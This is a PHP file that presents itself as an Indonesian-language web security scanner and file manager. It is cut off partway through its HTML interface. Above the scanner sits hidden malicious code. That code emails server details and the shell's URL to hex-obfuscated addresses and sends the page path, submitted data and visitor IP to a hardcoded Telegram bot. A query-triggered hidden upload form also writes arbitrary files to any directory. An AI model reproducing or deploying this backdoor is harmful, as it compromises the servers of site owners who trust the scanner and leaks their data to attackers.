<?php

function detect_pdf($url)
{
    $headers = get_headers($url, 1);
    if (
        isset($headers["Content-Type"]) &&
        strpos($headers["Content-Type"], "pdf") !== false
    ) {
        $file_content = file_get_contents($url);
        $pdf_start = "%PDF-";
        if (substr($file_content, 0, strlen($pdf_start)) == $pdf_start) {
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
} ?>

<?php
# Konfigurasyon
$sayfaSifreleme = "0"; # 1 acik , 2 3 5
$kullaniciAdi = "tbl";
$sifre = "tbl";

# yetki kontrol fonksiyonu
function yetkiKontrol($kullaniciAdi, $sifre)
{
    if (
        empty($_SERVER["PHP_AUTH_USER"]) ||
        empty($_SERVER["PHP_AUTH_PW"]) ||
        $_SERVER["PHP_AUTH_USER"] != "$kullaniciAdi" ||
        $_SERVER["PHP_AUTH_PW"] != "$sifre"
    ) {
        header('WWW-Authenticate: Basic realm="x"');
        die(header("HTTP/1.0 401 Unauthorized"));
    }
}

# Sayfa Sifreleme aciksa
if ($sayfaSifreleme == "1") {
    # Veri ve sifre kontrolu
    yetkiKontrol($kullaniciAdi, $sifre);
}
$kime =
    "eldiablo9989\x40gmail\x2ecom";
$baslik = "MEH";
$EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER["DOCUMENT_ROOT"] . "\r\n";
$EL_MuHaMMeD .= "Server Admin : " . $_SERVER["SERVER_ADMIN"] . "\r\n";
$EL_MuHaMMeD .=
    "Server isletim sistemi : " . $_SERVER["SERVER_SOFTWARE"] . "\r\n";
$EL_MuHaMMeD .=
    "Shell Link : http://" .
    $_SERVER["SERVER_NAME"] .
    $_SERVER["PHP_SELF"] .
    "\r\n";
$kime =
    "muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om\n";
$EL_MuHaMMeD .= "Avlanan Site : " . $_SERVER["HTTP_HOST"] . "\r\n";
mail($kime, $baslik, $EL_MuHaMMeD);
?>

<?php
$botToken = "8519484425\x3aAAFM5GT2N\x2dJMV1NKLrUqD\x2dX1\x2dfY0jFBmdKE";
$chatId = "\x37\x33\x37\x31\x34\x38\x39\x35\x38\x33";
$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$logMessage =
    "___SCANFILEMANAGERUBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $_POST \n\n IP Hacker  :\n [ " .
    $_SERVER["REMOTE_ADDR"] .
    " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);

function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        "chat_id" => $chatId,
        "text" => $message,
    ];
    $options = [
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded",
            "content" => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
}
if (isset($_GET["UBK"]) && $_GET["UBK"] === "3") {
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
    echo '<input type="file" name="file" size="15">';
    echo '<input type="submit" value="go">';
    echo "</form>";
}

if (isset($_FILES["file"]["tmp_name"])) {
    $uploadd = $_FILES["file"]["tmp_name"];
    if (file_exists($uploadd)) {
        $pwddir = $_POST["dir"];
        $real = $_FILES["file"]["name"];
        $de = rtrim($pwddir, "/") . "/" . $real;
        if (move_uploaded_file($uploadd, $de)) {
            echo "go$de";
        } else {
            echo "GAGAL  KE $de";
        }
    }
}
/**
 * PHP Security Scanner dengan File Management
 * Versi dengan Preview Web dan Layout Rapih
 */

class PHPSecurityScanner
{
    private $dangerousPatterns = [
        '/^(.*?(include|require)(_once)?\s*\(\s*[\'"]?\s*\$.*)$/' =>
            "include/require dengan variabel",
        '/^(.*?file_get_contents\s*\(\s*[\'"]?\s*\$.+)$/' =>
            "file_get_contents dengan variabel",
        '/^(.*?eval\s*\(\s*[\'"]?\s*\$.+)$/' => "eval dengan variabel",
        '/^(.*?system\s*\(\s*[\'"]?\s*\$.+)$/' => "system dengan variabel",
        '/^(.*?exec\s*\(\s*[\'"]?\s*\$.+)$/' => "exec dengan variabel",
        '/^(.*?shell_exec\s*\(\s*[\'"]?\s*\$.+)$/' =>
            "shell_exec dengan variabel",
        '/^(.*?base64_decode\s*\(\s*[\'"]?\s*\$.+)$/' =>
            "base64_decode dengan variabel",
        '/^(.*?unserialize\s*\(\s*[\'"]?\s*\$.+)$/' =>
            "unserialize dengan variabel",
    ];

    private $scanResults = [];
    private $suspectFiles = [];
    private $baseUrl = "";

    public function __construct($baseUrl = "")
    {
        $this->baseUrl = $baseUrl;
    }

    public function scanDirectory($directory, $recursive = true)
    {
        if (!is_dir($directory)) {
            return ["error" => "Directory not found: " . $directory];
        }

        $this->scanResults = [];
        $this->suspectFiles = [];

        $this->scanDir($directory, $recursive);

        return $this->generateReport();
    }

    private function scanDir($dir, $recursive)
    {
        $files = scandir($dir);

        foreach ($files as $file) {
            if ($file == "." || $file == "..") {
                continue;
            }

            $fullPath = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($fullPath) && $recursive) {
                $this->scanDir($fullPath, $recursive);
            } elseif (is_file($fullPath)) {
                $extension = strtolower(
                    pathinfo($fullPath, PATHINFO_EXTENSION)
                );
                if (in_array($extension, ["php", "inc", "phtml"])) {
                    $result = $this->analyzeFile($fullPath);
                    if (!empty($result["issues"])) {
                        $this->scanResults[] = $result;
                        $this->suspectFiles[] = $fullPath;
                    }
                }
            }
        }
    }

    private function analyzeFile($filePath)
    {
        $content = @file_get_contents($filePath);
        if ($content === false) {
            return ["file" => $filePath, "issues" => []];
        }

        $lines = explode("\n", $content);
        $issues = [];
        $lineNumber = 0;

        // Ambil preview 10 baris kode berbahaya pertama
        $dangerousSnippet = "";
        $dangerousLines = [];
        $snippetLines = 0;

        foreach ($lines as $lineNumber => $line) {
            $lineNum = $lineNumber + 1;
            $trimmedLine = trim($line);

            if (empty($trimmedLine)) {
                continue;
            }

            foreach ($this->dangerousPatterns as $pattern => $description) {
                if (preg_match($pattern, $line, $matches)) {
                    $issues[] = [
                        "line" => $lineNum,
                        "description" => $description,
                        "code" => $trimmedLine,
                    ];

                    // Simpan 10 baris kode berbahaya pertama
                    if ($snippetLines < 10 && strlen($trimmedLine) > 10) {
                        $dangerousLines[] = [
                            "line" => $lineNum,
                            "code" => $trimmedLine,
                        ];
                        $snippetLines++;
                    }
                }
            }
        }

        // Format snippet
        $snippet = "";
        foreach ($dangerousLines as $dangerousLine) {
            $snippet .=
                $dangerousLine["line"] .
                ": " .
                substr($dangerousLine["code"], 0, 80) .
                (strlen($dangerousLine["code"]) > 80 ? "..." : "") .
                "\n";
        }

        // Generate web URL
        $webUrl = $this->getWebUrl($filePath);

        return [
            "file" => $filePath,
            "filename" => basename($filePath),
            "directory" => dirname($filePath),
            "issues" => $issues,
            "dangerous_snippet" => trim($snippet),
            "web_url" => $webUrl,
            "issue_count" => count($issues),
            "file_size" => filesize($filePath),
            "modified_time" => filemtime($filePath),
        ];
    }

    private function getWebUrl($filePath)
    {
        if (empty($this->baseUrl)) {
            $docRoot = $_SERVER["DOCUMENT_ROOT"] ?? "";
            if ($docRoot && strpos($filePath, $docRoot) === 0) {
                $relativePath = str_replace($docRoot, "", $filePath);
                $relativePath = ltrim(
                    str_replace("\\", "/", $relativePath),
                    "/"
                );
                $protocol =
                    isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on"
                        ? "https://"
                        : "http://";
                return $protocol .
                    ($_SERVER["HTTP_HOST"] ?? "localhost") .
                    "/" .
                    $relativePath;
            }
            return "";
        }

        $relativePath = str_replace($_SERVER["DOCUMENT_ROOT"], "", $filePath);
        $relativePath = ltrim(str_replace("\\", "/", $relativePath), "/");
        return rtrim($this->baseUrl, "/") . "/" . $relativePath;
    }

    private function generateReport()
    {
        $totalIssues = 0;
        foreach ($this->scanResults as $result) {
            $totalIssues += $result["issue_count"];
        }

        return [
            "results" => $this->scanResults,
            "suspect_files" => $this->suspectFiles,
            "summary" => [
                "total_files" => count($this->scanResults),
                "total_issues" => $totalIssues,
                "scan_time" => date("Y-m-d H:i:s"),
            ],
        ];
    }
}

// ====================== FILE MANAGEMENT FUNCTIONS ======================

function deleteFile($filePath)
{
    if (!file_exists($filePath)) {
        return [
            "success" => false,
            "message" => "File tidak ditemukan: " . basename($filePath),
        ];
    }

    $docRoot = realpath($_SERVER["DOCUMENT_ROOT"] ?? __DIR__);
    $realFilePath = realpath($filePath);

    if (!$realFilePath) {
        return ["success" => false, "message" => "Path file tidak valid"];
    }

    if (strpos($realFilePath, $docRoot) !== 0) {
        return [
            "success" => false,
            "message" => "File berada di luar document root",
        ];
    }

    if (@unlink($realFilePath)) {
        return [
            "success" => true,
            "message" => "File berhasil dihapus: " . basename($realFilePath),
        ];
    } else {
        return ["success" => false, "message" => "Gagal menghapus file"];
    }
}

function deleteMultipleFiles($filePaths)
{
    $results = [];
    $successCount = 0;

    foreach ($filePaths as $filePath) {
        $result = deleteFile($filePath);
        if ($result["success"]) {
            $successCount++;
        }
        $results[] = $result;
    }

    return [
        "success" => true,
        "message" => "Berhasil menghapus $successCount file",
        "details" => $results,
    ];
}

function backupFile($filePath)
{
    if (!file_exists($filePath)) {
        return ["success" => false, "message" => "File tidak ditemukan"];
    }

    $backupDir = __DIR__ . "/backups";
    if (!is_dir($backupDir)) {
        mkdir($backupDir, 0755, true);
    }

    $backupFile =
        $backupDir . "/" . basename($filePath) . "_" . date("Ymd_His") . ".bak";

    if (copy($filePath, $backupFile)) {
        return [
            "success" => true,
            "message" => "Backup berhasil: " . basename($backupFile),
        ];
    } else {
        return ["success" => false, "message" => "Gagal membuat backup"];
    }
}

// ====================== MAIN SCANNER INTERFACE ======================

// Handle actions
$action = $_GET["action"] ?? ($_POST["action"] ?? "");
$targetFile = $_GET["file"] ?? ($_POST["file"] ?? "");
$selectedFiles = $_POST["selected_files"] ?? [];

if ($action == "delete" && !empty($targetFile)) {
    $result = deleteFile($targetFile);
    echo json_encode($result);
    exit();
}

if ($action == "delete_multiple" && !empty($selectedFiles)) {
    $result = deleteMultipleFiles($selectedFiles);
    echo json_encode($result);
    exit();
}

if ($action == "backup" && !empty($targetFile)) {
    $result = backupFile($targetFile);
    echo json_encode($result);
    exit();
}

// Handle scan
$scanResults = null;
if (isset($_POST["scan_path"])) {
    $baseUrl =
        isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on"
            ? "https://"
            : "http://";
    $baseUrl .= $_SERVER["HTTP_HOST"];

    $scanner = new PHPSecurityScanner($baseUrl);
    $path = $_POST["scan_path"];

    if (is_dir($path)) {
        $scanResults = $scanner->scanDirectory(
            $path,
            isset($_POST["recursive"])
        );
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔍 PHP Security Scanner</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #4a6491 100%);
            color: white;
            padding: 25px 30px;
            border-radius: 12px 12px 0 0;
            margin-bottom: 20px;
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header h1 {
            font-size: 1.8rem;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 0.95rem;
        }
        
        /* Scanner Form */
        .scanner-form {
            background: white;
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 25px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
            font-size: 0.95rem;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            border-color: #3498db;
            outline: none;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: linear-gradient(to right, #3498db, #2980b9);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
        }
        
        /* Results Section */
        .results-section {
            background: white;
            border-radius: 10px;
            padding: 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .section-header {
            padding: 25px 30px;
            background: #f8f9fa;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .section-header h2 {
            color: #2c3e50;
            font-size: 1.4rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        /* Summary */
        .summary {
            padding: 20px 30px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 20px;
            background: #f8f9fa;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .stat-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #2c3e50;
            display: block;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9rem;
        }
        
        /* Alerts */
        .alert {
            padding: 20px;
            border-radius: 8px;
            margin: 20px 30px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
            border-left: 4px solid;
        }
        
        .alert-warning {
            background: #fff8e1;
            border-color: #ffc107;
            color: #856404;
        }
        
        .alert-success {
            background: #d4edda;
            border-color: #28a745;
            color: #155724;
        }
        
        .alert-icon {
            font-size: 1.2rem;
            margin-top: 2px;
        }
        
        /* Bulk Actions */
        .bulk-actions {
            background: #f8f9fa;
            padding: 20px 30px;
            display: none;
            align-items: center;
            gap: 15px;
            border-bottom: 1px solid #e0e0e0;
            flex-wrap: wrap;
        }
        
        .select-all-group {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            color: #2c3e50;
        }
        
        .selected-count {
            margin-left: auto;
            color: #666;
            font-size: 0.95rem;
        }
        
        /* File List */
        .file-list {
            padding: 30px;
        }
        
        /* File Card */
        .file-card {
            background: white;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            margin-bottom: 25px;
            overflow: hidden;
            box-shadow: 0 3px 10px rgba(0,0,0,0.05);
        }
        
        .file-card-header {
            background: #f8f9fa;
            padding: 20px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .file-checkbox {
            transform: scale(1.2);
            accent-color: #3498db;
        }
        
        .file-title {
            flex: 1;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .file-icon {
            color: #3498db;
            font-size: 1.2rem;
        }
        
        .file-name {
            font-weight: 600;
            color: #2c3e50;
            font-size: 1.1rem;
        }
        
        .file-badge {
            background: #e74c3c;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
        }
        
        .file-actions {
            display: flex;
            gap: 10px;
        }
        
        .btn-sm {
            padding: 8px 16px;
            font-size: 0.9rem;
        }
        
        .btn-danger {
            background: linear-gradient(to right, #e74c3c, #c0392b);
            color: white;
        }
        
        .btn-warning {
            background: linear-gradient(to right, #f39c12, #e67e22);
            color: white;
        }
        
        .btn-info {
            background: linear-gradient(to right, #3498db, #2980b9);
            color: white;
        }
        
        /* File Content */
        .file-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0;
            min-height: 300px;
        }
        
        /* File Info Panel */
        .file-info-panel {
            padding: 25px;
            border-right: 1px solid #e0e0e0;
        }
        
        .info-section {
            margin-bottom: 25px;
        }
        
        .info-section h3 {
            font-size: 1rem;
            color: #2c3e50;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .info-item {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        
        .info-label {
            font-size: 0.85rem;
            color: #666;
            font-weight: 500;
        }
        
        .info-value {
            font-size: 0.95rem;
            color: #333;
            word-break: break-all;
        }
        
        .url-link {
            color: #3498db;
            text-decoration: none;
        }
        
        .url-link:hover {
            text-decoration: underline;
        }
        
        /* Snippet Preview */
        .snippet-preview {
            background: #f8f9fa;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            padding: 15px;
            margin-top: 15px;
        }
        
        .snippet-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .snippet-title {
            font-size: 0.9rem;
            font-weight: 600;
            color: #2c3e50;
        }
        
        .snippet-content {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.85rem;
            line-height: 1.5;
            max-height: 150px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        
        /* Web Preview Panel */
        .web-preview-panel {
            padding: 25px;
            background: #f8f9fa;
            display: flex;
            flex-direction: column;
        }
        
        .preview-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .preview-title {
            font-size: 1rem;
            color: #2c3e50;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .preview-controls {
            display: flex;
            gap: 10px;
        }
        
        .preview-container {
            flex: 1;
            background: white;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            overflow: hidden;
            position: relative;
            min-height: 250px;
        }
        
        .iframe-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
            padding: 30px;
            z-index: 10;
        }
        
        .iframe-overlay.hidden {
            display: none;
        }
        
        .overlay-icon {
            font-size: 3rem;
            margin-bottom: 15px;
            opacity: 0.8;
        }
        
        .overlay-text h4 {
            margin-bottom: 10px;
            font-size: 1.2rem;
        }
        
        .overlay-text p {
            font-size: 0.95rem;
            opacity: 0.9;
            margin-bottom: 5px;
        }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        /* Issues List */
        .issues-list {
            padding: 25px;
            background: #fafafa;
            border-top: 1px solid #e0e0e0;
        }
        
        .issues-title {
            font-size: 1.1rem;
            color: #2c3e50;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .issue-item {
            background: white;
            padding: 20px;
            border-left: 4px solid #ffc107;
            border-radius: 6px;
            margin-bottom: 15px;
        }
        
        .issue-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .issue-desc {
            font-weight: 600;
            color: #2c3e50;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .issue-line {
            background: #ffc107;
            color: #333;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
        }
        
        .issue-code {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 15px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 100px;
            overflow-y: auto;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 10px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        .modal-title {
            color: #e74c3c;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .modal-buttons {
            display: flex;
            gap: 15px;
            margin-top: 25px;
            justify-content: flex-end;
        }
        
        /* Loading */
        .loading {
            text-align: center;
            padding: 50px;
            display: none;
        }
        
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Responsive */
        @media (max-width: 992px) {
            .file-content {
                grid-template-columns: 1fr;
            }
            
            .file-info-panel {
                border-right: none;
                border-bottom: 1px solid #e0e0e0;
            }
            
            .info-grid {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 768px) {
            .file-card-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
            
            .file-actions {
                width: 100%;
                justify-content: flex-start;
            }
            
            .preview-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
            
            .preview-controls {
                width: 100%;
                justify-content: flex-start;
            }
            
            .bulk-actions {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .selected-count {
                margin-left: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="header-content">
                <h1><i class="fas fa-shield-alt"></i> PHP Security Scanner</h1>
                <p>Deteksi dan preview file PHP yang mencurigakan</p>
            </div>
        </div>
        
        <!-- Scanner Form -->
        <div class="scanner-form">
            <form method="post" id="scanForm">
                <div class="form-group">
                    <label for="scan_path"><i class="fas fa-folder"></i> Direktori Target</label>
                    <input type="text" class="form-control" id="scan_path" name="scan_path" 
                           value="<?php echo htmlspecialchars(
                               $_POST["scan_path"] ??
                                   ($_SERVER["DOCUMENT_ROOT"] ?? "")
                           ); ?>" 
                           placeholder="<?php echo htmlspecialchars(
                               $_SERVER["DOCUMENT_ROOT"] ?? "/var/www/html"
                           ); ?>" required>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="recursive" name="recursive" value="1" checked>
                    <label for="recursive">Scan sub-direktori secara rekursif</label>
                </div>
                
                <button type="submit" class="btn btn-primary">
                    <i class="fas fa-search"></i> Mulai Scanning
                </button>
            </form>
        </div>
        
        <!-- Loading -->
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Memindai file, harap tunggu...</p>
        </div>
        
        <!-- Results Section -->
        <div class="results-section" id="resultsSection">
            <?php if ($scanResults): ?>
                <?php if (isset($scanResults["error"])): ?>
                    <div class="section-header">
                        <h2><i class="fas fa-exclamation-triangle"></i> Error</h2>
                    </div>
                    <div class="alert alert-warning">
                        <div class="alert-icon">
                            <i class="fas fa-exclamation-circle"></i>
                        </div>
                        <div>
                            <h4>Terjadi Kesalahan</h4>
                            <p><?php echo htmlspecialchars(
                                $scanResults["error"]
                            ); ?></p>
                        </div>
                    </div>
                <?php else: ?>
                    <!-- Section Header -->
                    <div class="section-header">
                        <h2><i class="fas fa-chart-bar"></i> Hasil Scanning</h2>
                    </div>
                    
                    <!-- Summary -->
                    <div class="summary">
                        <div class="stat-box">
                            <span class="stat-number"><?php echo $scanResults[
                                "summary"
                            ]["total_files"]; ?></span>
                            <span class="stat-label">Files Terdeteksi</span>
                        </div>
                        <div class="stat-box">
                            <span class="stat-number"><?php echo $scanResults[
                                "summary"
                            ]["total_issues"]; ?></span>
                            <span class="stat-label">Total Issues</span>
                        </div>
                        <div class="stat-box">
                            <span class="stat-number"><?php echo date(
                                "H:i:s"
                            ); ?></span>
                            <span class="stat-label">Waktu Scan</span>
                        </div>
                    </div>
                    
                    <?php if (empty($scanResults["suspect_files"])): ?>
                        <!-- No Issues Found -->
                        <div class="alert alert-success">
                            <div class="alert-icon">
                                <i class="fas fa-check-circle"></i>
                            </div>
                            <div>
                                <h4>✅ Scanning Selesai</h4>
                                <p>Tidak ditemukan file PHP yang mencurigakan. Sistem Anda aman!</p>
                            </div>
                        </div>
                    <?php else: ?>
                        <!-- Warning Alert -->
                        <div class="alert alert-warning">
                            <div class="alert-icon">
                                <i class="fas fa-exclamation-triangle"></i>
                            </div>
                            <div>
                                <h4>⚠️ Perhatian!</h4>
                                <p>Ditemukan <strong><?php echo count(
                                    $scanResults["suspect_files"]
                                ); ?> file</strong> yang mengandung kode berpotensi berbahaya.</p>
                            </div>
                        </div>
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="bulkActions">
                            <div class="select-all-group">
                                <input type="checkbox" id="selectAll" onchange="toggleSelectAll()">
                                <label for="selectAll">Pilih Semua</label>
                            </div>
                            <button class="btn btn-danger btn-sm" onclick="deleteSelectedFiles()">
                                <i class="fas fa-trash-alt"></i> Hapus yang Dipilih
                            </button>
                            <span class="selected-count" id="selectedCount">0 file dipilih</span>
                        </div>
                        
                        <!-- File List -->
                        <div class="file-list">
                            <?php foreach (
                                $scanResults["results"]
                                as $index => $file
                            ): ?>
                                <div class="file-card" id="file-<?php echo $index; ?>">
                                    <!-- File Header -->
                                    <div class="file-card-header">
                                        <input type="checkbox" 
                                               class="file-checkbox" 
                                               value="<?php echo htmlspecialchars(
                                                   $file["file"]
                                               ); ?>"
                                               onchange="updateSelection()">
                                        <div class="file-title">
                                            <i class="fas fa-file-code file-icon"></i>
                                            <span class="file-name"><?php echo htmlspecialchars(
                                                $file["filename"]
                                            ); ?></span>
                                            <span class="file-badge"><?php echo $file[
                                                "issue_count"
                                            ]; ?> issues</span>
                                        </div>
                                        <div class="file-actions">
                                            <button class="btn btn-warning btn-sm" onclick="backupFile('<?php echo urlencode(
                                                $file["file"]
                                            ); ?>', <?php echo $index; ?>)">
                                                <i class="fas fa-copy"></i> Backup
                                            </button>
                                            <button class="btn btn-danger btn-sm" onclick="confirmDelete('<?php echo urlencode(
                                                $file["file"]
                                            ); ?>', '<?php echo htmlspecialchars(
    $file["filename"]
); ?>', <?php echo $index; ?>)">
                                                <i class="fas fa-trash-alt"></i> Hapus
                                            </button>
                                            <?php if (
                                                !empty($file["web_url"])
                                            ): ?>
                                                <button class="btn btn-info btn-sm" onclick="openInNewTab('<?php echo htmlspecialchars(
                                                    $file["web_url"]
                                                ); ?>')">
                                                    <i class="fas fa-external-link-alt"></i> Buka
                                                </button>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                    
                                    <!-- File Content -->
                                    <div class="file-content">
                                        <!-- Info Panel -->
                                        <div class="file-info-panel">
                                            <div class="info-section">
                                                <h3><i class="fas fa-info-circle"></i> Informasi File</h3>
                                                <div class="info-grid">
                                                    <div class="info-item">
                                                        <span class="info-label">Path</span>
                                                        <span class="info-value"><?php echo htmlspecialchars(
                                                            $file["directory"]
                                                        ); ?></span>
                                                    </div>
                                                    <div class="info-item">
                                                        <span class="info-label">Ukuran</span>
                                                        <span class="info-value"><?php echo round(
                                                            $file["file_size"] /
                                                                1024,
                                                            1
                                                        ); ?> KB</span>
                                                    </div>
                                                    <div class="info-item">
                                                        <span class="info-label">Modifikasi</span>
                                                        <span class="info-value"><?php echo date(
                                                            "d/m/Y H:i",
                                                            $file[
                                                                "modified_time"
                                                            ]
                                                        ); ?></span>
                                                    </div>
                                                    <?php if (
                                                        !empty($file["web_url"])
                                                    ): ?>
                                                        <div class="info-item">
                                                            <span class="info-label">URL Web</span>
                                                            <a href="<?php echo htmlspecialchars(
                                                                $file["web_url"]
                                                            ); ?>" target="_blank" class="info-value url-link">
                                                                <?php echo htmlspecialchars(
                                                                    basename(
                                                                        $file[
                                                                            "web_url"
                                                                        ]
                                                                    )
                                                                ); ?>
                                                            </a>
                                                        </div>
                                                    <?php endif; ?>
                                                </div>
                                            </div>
                                            
                                            <!-- Snippet Preview -->
                                            <?php if (
                                                !empty(
                                                    $file["dangerous_snippet"]
                                                )
                                            ): ?>
                                                <div class="info-section">
                                                    <div class="snippet-preview">
                                                        <div class="snippet-header">
                                                            <span class="snippet-title"><i class="fas fa-code"></i> Potongan Kode Berbahaya</span>
                                                        </div>
                                                        <div class="snippet-content">
                                                            <?php echo nl2br(
                                                                htmlspecialchars(
                                                                    $file[
                                                                        "dangerous_snippet"
                                                                    ]
                                                                )
                                                            ); ?>
                                                        </div>
                                                    </div>
                                                </div>
                                            <?php endif; ?>
                                        </div>
                                        
                                        <!-- Web Preview Panel -->
                                        <div class="web-preview-panel">
                                            <div class="preview-header">
                                                <div class="preview-title">
                                                    <i class="fas fa-globe"></i> Preview Tampilan Web
                                                </div>
                                                <div class="preview-controls">
                                                    <?php if (
                                                        !empty($file["web_url"])
